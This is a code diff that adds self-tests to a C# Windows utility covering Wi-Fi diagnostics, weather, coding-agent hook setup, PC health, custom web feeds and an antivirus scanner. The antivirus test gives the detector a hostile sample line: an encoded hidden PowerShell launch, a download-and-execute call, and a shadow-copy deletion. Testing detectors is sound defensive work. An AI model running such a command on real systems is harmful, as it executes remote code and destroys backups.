@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -19,6 +19,7 @@ namespace NIsland.Services
         public static int Run(string[] args)
         {
             Store.UseDefaults();
+            System.Text.Encoding.RegisterProvider(System.Text.CodePagesEncodingProvider.Instance);
             try
             {
                 return args[1] switch
@@ -29,10 +30,180 @@ namespace NIsland.Services
                     "net" => Task.Run(() => NetTest(args[2])).GetAwaiter().GetResult(),
                     "audio" => AudioTest(args[2]),
                     "osint2" => Task.Run(() => Osint2Test(args[2])).GetAwaiter().GetResult(),
+                    "tgbot" => TgBotTest.Run(args[2]),
+                    "viz" => VizBench(args[2]),
+                    "av" => Task.Run(() => AvTest(args[2])).GetAwaiter().GetResult(),
+                    "custom" => Task.Run(() => CustomTest(args[2])).GetAwaiter().GetResult(),
+                    "mcp" => McpTest.Run(args[2]),
+                    "health" => Task.Run(() => HealthTest(args[2])).GetAwaiter().GetResult(),
+                    "agents" => Task.Run(() => AgentsTest(args[2])).GetAwaiter().GetResult(),
+                    "weather" => Task.Run(() => WeatherTest(args[2])).GetAwaiter().GetResult(),
+                    "wifi2" => Task.Run(() => Wifi2Test(args[2])).GetAwaiter().GetResult(),
                     _ => 2,
                 };
             }
             catch (Exception e) { File.WriteAllText(args[^1], e.ToString()); return 1; }
+        }
+
+        /// <summary>Новые инструменты сети — только чтение: ничего не переключает и не чинит.</summary>
+        static async Task<int> Wifi2Test(string output)
+        {
+            var sb = new StringBuilder();
+            async Task T(string name, Func<Task<string>> f)
+            {
+                var sw = Stopwatch.StartNew();
+                try { sb.AppendLine($"== {name} ({sw.ElapsedMilliseconds} ms)\n" + await f()); }
+                catch (Exception e) { sb.AppendLine($"== {name} FAIL {e.GetType().Name}: {e.Message}"); }
+            }
+            await T("adapter", () => Task.FromResult(string.Join("\n", WifiTools2.AdapterInfo().Select(r => r.K + ": " + r.V))));
+            await T("hotspot", () => Task.FromResult(WifiTools2.HotspotState()?.ToString() ?? "null"));
+            await T("dns", async () => string.Join("\n", (await WifiTools2.DnsBenchmark()).Select(d => $"{d.Name} {d.Ip} {d.Ms:0}")));
+            await T("trace", async () => string.Join("\n", (await WifiTools2.Trace("google.com")).Select(h => $"{h.Hop} {h.Ip} {h.Host} {h.Ms:0}")));
+            await T("regions", async () => string.Join("\n", await Task.WhenAll(WifiTools2.Regions.Select(async r => r.Name + " " + (await WifiTools2.TcpMs(r.Host)).ToString("0")))));
+            await T("security", async () => string.Join("\n", WifiTools2.Security(await WifiTools.Nearby()).Select(x => x.Level + " " + x.Title)));
+            await T("stability10s", async () => { var r = await WifiTools2.Stability(10, null); return $"{r.Verdict} avg={r.Avg:0} jit={r.Jitter:0} lost={r.Lost}"; });
+            await T("password", () => Task.FromResult(WifiTools2.StrongPassword() + " " + WifiTools2.Strength(WifiTools2.StrongPassword()) + " / 12345678 " + WifiTools2.Strength("12345678")));
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        static async Task<int> WeatherTest(string output)
+        {
+            Store.Settings.WeatherCity = "Mykolaiv";
+            var w = await WeatherService.Get(true);
+            var sb = new StringBuilder();
+            if (w == null) sb.AppendLine("null: " + WeatherService.LastError);
+            else
+            {
+                sb.AppendLine($"{w.City} {w.Temp}° feels {w.Feels} dew {w.DewPoint} vis {w.Visibility} cloud {w.Cloud} aqi {w.Aqi}");
+                sb.AppendLine("pollen: " + string.Join(", ", w.Pollen.Select(p => p.Key + "=" + p.Value)) + " → " + WeatherService.PollenText(w));
+                sb.AppendLine("gusts/day: " + string.Join(" ", w.DayGust) + " precip: " + string.Join(" ", w.DayPrecip));
+                sb.AppendLine("moon: " + WeatherService.Moon(DateTime.Now));
+                sb.AppendLine("tomorrow: " + WeatherService.Tomorrow(w));
+                sb.AppendLine("danger: " + WeatherService.Danger(w));
+                foreach (var a in WeatherService.Advice(w)) sb.AppendLine("advice: " + a);
+            }
+            sb.AppendLine("Lviv: " + await WeatherService.Brief("Lviv"));
+            sb.AppendLine("Nowhere: " + await WeatherService.Brief("Qwxzzz"));
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        static async Task<int> AgentsTest(string output)
+        {
+            var sb = new StringBuilder();
+            foreach (var a in await Agents.Detect()) sb.AppendLine($"found {a.Kind.Name} {a.Version} {a.Path}");
+            foreach (var r in await Agents.Running()) sb.AppendLine($"running {r.Pid} {r.Agent} {r.Started:HH:mm} {r.CommandLine}");
+            var u = await Agents.ClaudeUsageToday();
+            sb.AppendLine($"usage today: sessions {u.Sessions} in {u.In} out {u.Out} cache {u.Cache}");
+            sb.AppendLine("parse: " + Agents.ParseForTest("claude", "{\"hook_event_name\":\"Notification\",\"message\":\"Claude needs your permission to use Bash\",\"cwd\":\"C:\\\\Proj\\\\app\"}"));
+            sb.AppendLine("parse: " + Agents.ParseForTest("claude", "{\"hook_event_name\":\"Stop\",\"cwd\":\"C:\\\\Proj\\\\app\"}"));
+            sb.AppendLine("parse: " + Agents.ParseForTest("codex", "{\"type\":\"agent-turn-complete\",\"last-assistant-message\":\"Fixed 3 tests\"}"));
+            // хуки — на временной папке вместо настоящей домашней
+            var tmp = Path.Combine(Path.GetTempPath(), "nisland-agents-test-" + Guid.NewGuid().ToString("N")[..6]);
+            Directory.CreateDirectory(Path.Combine(tmp, ".claude"));
+            Directory.CreateDirectory(Path.Combine(tmp, ".codex"));
+            File.WriteAllText(Path.Combine(tmp, ".claude", "settings.json"), "{\n  \"model\": \"opus\",\n  \"hooks\": { \"Stop\": [ { \"hooks\": [ { \"type\": \"command\", \"command\": \"echo mine\" } ] } ] }\n}");
+            File.WriteAllText(Path.Combine(tmp, ".codex", "config.toml"), "model = \"gpt-5\"\n\n[profiles.fast]\nmodel = \"o4-mini\"\n");
+            Agents.HomeOverride = tmp;
+            sb.AppendLine("hook claude: " + (Agents.HookClaude(true) ?? "ok") + " hooked=" + Agents.ClaudeHooked());
+            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".claude", "settings.json")));
+            sb.AppendLine("unhook claude: " + (Agents.HookClaude(false) ?? "ok") + " hooked=" + Agents.ClaudeHooked());
+            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".claude", "settings.json")));
+            sb.AppendLine("hook codex: " + (Agents.HookCodex(true) ?? "ok") + " hooked=" + Agents.CodexHooked());
+            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".codex", "config.toml")));
+            sb.AppendLine("unhook codex: " + (Agents.HookCodex(false) ?? "ok") + " hooked=" + Agents.CodexHooked());
+            Agents.HomeOverride = null;
+            Directory.Delete(tmp, true);
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        /// <summary>Здоровье ПК — только чтение (турбо, обновления и удаление не вызываются).</summary>
+        static async Task<int> HealthTest(string output)
+        {
+            var sb = new StringBuilder();
+            async Task T(string name, Func<Task<string>> f)
+            {
+                var sw = Stopwatch.StartNew();
+                string r;
+                try { r = await f(); } catch (Exception e) { r = "FAIL " + e.GetType().Name + ": " + e.Message; }
+                sb.AppendLine($"== {name} ({sw.ElapsedMilliseconds} ms)");
+                sb.AppendLine(r);
+            }
+            await T("score", async () => { var (s, i) = await PcHealth.Score(_ => { }); return s + "\n" + string.Join("\n", i.Select(x => $"-{x.Penalty} {x.Title} | {x.Advice}")); });
+            await T("raw", () => Task.FromResult(Maint.RunCmd("wevtutil", "qe Application /q:\"*[System[(EventID=1000)]]\" /c:2 /rd:true /f:xml") is var raw ? raw.Length + " " + (raw.Length > 300 ? raw[..300] : raw) : ""));
+            await T("crashes", async () => string.Join("\n", (await PcHealth.Crashes(30)).Take(12).Select(c => $"{c.At:dd.MM HH:mm} {c.Kind} {c.App} {c.Detail}")));
+            await T("devices", async () => string.Join("\n", (await PcHealth.ProblemDevices()).Select(d => $"{d.Name} {d.Code} {d.Meaning}")));
+            await T("cpu", async () => (await PcHealth.Cpu()).ToString());
+            await T("wu", async () => (await PcHealth.WindowsUpdate()).ToString() + " trim=" + PcHealth.TrimState());
+            await T("disk", async () => string.Join("\n", (await PcHealth.DiskUsage()).Select(d => $"{d.Name} {Maint.Size(d.Bytes)}")));
+            await T("large", async () => string.Join("\n", (await PcHealth.LargeFiles(8)).Select(f => $"{Maint.Size(f.Length)} {f.FullName}")));
+            await T("dups", async () => { var g = await PcHealth.Duplicates(null); return $"groups {g.Count}\n" + string.Join("\n", g.Take(5).Select(x => $"{x.Count}× {Maint.Size(x[0].Length)} {x[0].Name}")); });
+            await T("winget", async () => { var (l, e) = await PcHealth.WingetUpgrades(); return (e ?? "") + $" count {l.Count}\n" + string.Join("\n", l.Take(8).Select(u => $"{u.Name} | {u.Id} | {u.Current} -> {u.Available}")); });
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        static async Task<int> CustomTest(string output)
+        {
+            var sb = new StringBuilder();
+            async Task Try(CustomHub h)
+            {
+                for (int round = 1; round <= 2; round++)
+                {
+                    try { await h.Poll(); sb.AppendLine($"{h.Name} #{round}: {h.Status}"); foreach (var r in h.Rows.Take(3)) sb.AppendLine($"   · {r.Title} | {r.Sub} | {r.Url}"); }
+                    catch (Exception e) { sb.AppendLine($"{h.Name} #{round}: FAIL {e.GetType().Name}: {e.Message}"); }
+                }
+            }
+            foreach (var name in new[] { "Биткоин (CoinGecko)", "Hacker News по слову", "Погода по координатам (Open-Meteo)", "Новые вопросы Stack Overflow по тегу" })
+                await Try(CustomHubs.Create(CustomHubs.Templates.First(t => t.Name == name)));
+            var page = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "page"), "Пример страницы");
+            Integrations.SetValue(page, "url", "https://example.com");
+            await Try(page);
+            var page2 = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "page"), "Заголовок страницы");
+            Integrations.SetValue(page2, "url", "https://example.com"); Integrations.SetValue(page2, "regex", "<h1>(.*?)</h1>");
+            await Try(page2);
+            var st = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "status"), "Несуществующий сайт");
+            Integrations.SetValue(st, "url", "https://nonexistent.invalid");
+            await Try(st);
+            var bad = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "list"), "Неверный путь");
+            Integrations.SetValue(bad, "url", "https://hn.algolia.com/api/v1/search?query=x"); Integrations.SetValue(bad, "items", "nope"); Integrations.SetValue(bad, "title", "title");
+            await Try(bad);
+            sb.AppendLine("path test: " + CustomHub.Path(System.Text.Json.JsonDocument.Parse("{\"a\":{\"b\":[{\"c\":5}]}}").RootElement, "a.b[0].c"));
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        static async Task<int> AvTest(string output)
+        {
+            var sb = new StringBuilder();
+            var sw = Stopwatch.StartNew();
+            sb.AppendLine("db update: " + (await Antivirus.UpdateDb() ?? "ok") + $" · {Antivirus.DbCount} записей · {sw.ElapsedMilliseconds} ms");
+            sb.AppendLine("amsi benign: " + Antivirus.AmsiMalware(Encoding.UTF8.GetBytes("Write-Host 'hello world'"), "test.ps1"));
+            sb.AppendLine("script rules: " + string.Join(" | ", Antivirus.ScriptRulesForTest("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA; iex (New-Object Net.WebClient).DownloadString('http://x'); vssadmin delete shadows /all")));
+            sb.AppendLine("script rules clean: " + Antivirus.ScriptRulesForTest("Get-ChildItem C:\\ | Sort-Object Length").Count);
+            foreach (var f in new[] { Environment.SystemDirectory + "\\notepad.exe", Environment.SystemDirectory + "\\kernel32.dll", Environment.ProcessPath,
+                                      @"C:\Users\maksym\Desktop\LibreOffice_26.8.0_Win_x86-64.msi" })
+            {
+                if (!File.Exists(f)) continue;
+                sw.Restart();
+                var t = Antivirus.ScanFile(f);
+                sb.AppendLine($"scan {Path.GetFileName(f)}: {t.Score} {t.Verdict} · {sw.ElapsedMilliseconds} ms · {string.Join(" | ", t.Reasons)}");
+            }
+            sw.Restart();
+            var found = await Antivirus.QuickScan(null, default);
+            sb.AppendLine($"quick scan: {Store.Settings.AvLastCount} files, {found.Count} flagged, {sw.ElapsedMilliseconds} ms");
+            foreach (var t in found.Take(15)) sb.AppendLine($"  {t.Score} {t.Verdict} {t.Path} · {string.Join(" | ", t.Reasons)}");
+            foreach (var a in await Antivirus.Audit()) sb.AppendLine($"audit {a.Level}: {a.Title} | {a.Advice}");
+            File.WriteAllText(output, sb.ToString());
+            return 0;
+        }
+
+        static int VizBench(string output)
+        {
+            File.WriteAllText(output, NIsland.Controls.Visualizer.Bench(320, 180, Path.ChangeExtension(output, ".png")));
+            return 0;
         }
 
         /// <summary>Какие интеграции проверять (selftest hub out ключ1,ключ2) — по умолчанию все из списка.</summary>
@@ -105,15 +276,16 @@ namespace NIsland.Services
             Cfg("todoist", ("token", "wrong"));
             Cfg("listenbrainz", ("token", "wrong"));
             Cfg("ha", ("url", "http://127.0.0.1:59999"), ("token", "x"), ("entities", "light.kitchen"));
-            Cfg("alerts", ("oblast", "Миколаївська область"), ("places", "м. Київ\nНікопольський район\nНеіснуюче місце"));
             Cfg("discord", ("url", "https://discord.com/api/webhooks/0/wrong"));
             Cfg("stocks", ("symbols", "AAPL, ^GSPC, EURUSD=X"));
             Cfg("hn", ("score", "300"));
-            Cfg("monobank", ("token", "wrong"));
             Cfg("mail", ("host", "imap.gmail.com"), ("user", "nisland.selftest@gmail.com"), ("password", "wrong"));
             Cfg("toggl", ("token", "wrong"));
             Cfg("linear", ("key", "wrong"));
             Cfg("bluesky", ("handle", "nisland-selftest.bsky.social"), ("password", "wrong-wrong"));
+            Cfg("releases", ("repos", "Neizvestnyi22/N-Island\nobsproject/obs-studio\nnot/existing-repo-xyz"));
+            Cfg("deals", ("max", "5"), ("watch", "Hollow Knight"));
+            Cfg("games"); Cfg("quakes", ("radius", "20000")); Cfg("kp"); Cfg("apod"); Cfg("onthisday");
             {
                 var n = Integrations.Get("ntfy");
                 var sw0 = Stopwatch.StartNew();
@@ -123,8 +295,8 @@ namespace NIsland.Services
                 try { await n.Poll(); sb.AppendLine($"ntfy poll {sw0.ElapsedMilliseconds} ms"); }
                 catch (Exception e) { sb.AppendLine($"ntfy poll FAIL {sw0.ElapsedMilliseconds} ms {e.GetType().Name}: {e.Message} {e.InnerException?.Message}"); }
             }
-            foreach (var key in args2 ?? new[] { "ntfy", "rates", "novaposhta", "uptime", "rss", "ics", "telegram", "github", "todoist", "listenbrainz", "ha", "alerts", "discord",
-                                                 "stocks", "hn", "monobank", "mail", "toggl", "linear", "bluesky" })
+            foreach (var key in args2 ?? new[] { "ntfy", "rates", "novaposhta", "uptime", "rss", "ics", "telegram", "github", "todoist", "listenbrainz", "ha", "discord",
+                                                 "stocks", "hn", "mail", "toggl", "linear", "bluesky" })
             {
                 var it = Integrations.Get(key);
                 var sw = Stopwatch.StartNew();
